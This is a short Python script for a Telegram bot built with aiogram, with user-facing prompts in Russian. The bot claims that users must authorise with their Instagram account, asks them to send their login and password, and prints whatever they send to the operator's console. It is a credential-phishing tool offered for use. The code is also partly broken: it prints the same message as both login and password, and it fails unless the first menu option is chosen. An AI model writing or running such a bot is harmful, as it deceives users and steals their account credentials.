from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor

print("Выбери сервис")
print("[1]-Instagram")

quest = input(">:")
if quest == '1':
	API = input("Your telegram API Key:")

bot = Bot(token=API)
dp = Dispatcher(bot)

print("Bot started")

@dp.message_handler(commands=['start'])
async def start_command(message):
	await message.reply('Для использования бота вам нужно авторизоваться через свой Instagram аккаунт.\nВведи команду /login чтобы авторизоваться.')

@dp.message_handler(commands=['login'])
async def login(message):
		await message.reply("Введи логин и пароль своей уче́тной записи Instagram.")

@dp.message_handler()
async def log_pass(message: types.Message):
	print("Login:", message.text)
	print("Password:", message.text)

if __name__ == '__main__':
	executor.start_polling(dp)
	